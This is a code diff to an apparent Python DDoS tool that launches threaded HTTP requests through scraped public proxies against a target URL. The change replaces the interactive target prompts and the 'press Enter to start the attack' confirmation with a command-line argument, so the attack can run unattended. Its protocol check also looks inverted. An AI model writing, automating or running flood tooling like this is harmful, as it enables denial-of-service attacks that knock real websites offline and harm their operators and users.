@@ -1,5 +1,6 @@
 import cfscrape
 import os
+import sys
 import random
 import time
 import requests
@@ -22,7 +23,7 @@ def opth():
 		print("Threads " + str(a+1) + " Created ")
 	print(Fore.RED + "Wait A Few Seconds For Threads Ready To Attack ...")
 	time.sleep(10)
-	input(Fore.CYAN + "Saldiriyi Baslatmak icin Enter tusuna basin!")
+	#input(Fore.CYAN + "Saldiriyi Baslatmak icin Enter tusuna basin!")
 	global oo
 	oo = True
 
@@ -33,9 +34,15 @@ def main():
 	global pprr
 	global thr
 	global per
-	url = str(input(Fore.GREEN + "Url : " + Fore.WHITE))
-	ssl = str(input(Fore.GREEN + "Site SSL kullaniyormu ? (y/n) : " + Fore.WHITE))
-	ge = str(input(Fore.GREEN + "Yeni Proxy Listesi Al ? (y/n) : " + Fore.WHITE))
+	#url = str(input(Fore.GREEN + "Url : " + Fore.WHITE))
+	#ssl = str(input(Fore.GREEN + "Site SSL kullaniyormu ? (y/n) : " + Fore.WHITE))
+	#ge = str(input(Fore.GREEN + "Yeni Proxy Listesi Al ? (y/n) : " + Fore.WHITE))
+	url = sys.argv[1]
+	if url.find("http") == -1:
+		ssl = "y"
+	else:
+		ssl = "n"
+	ge = "y"
 	if ge =='y':
 		if ssl == 'y':
 			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By GogoZin
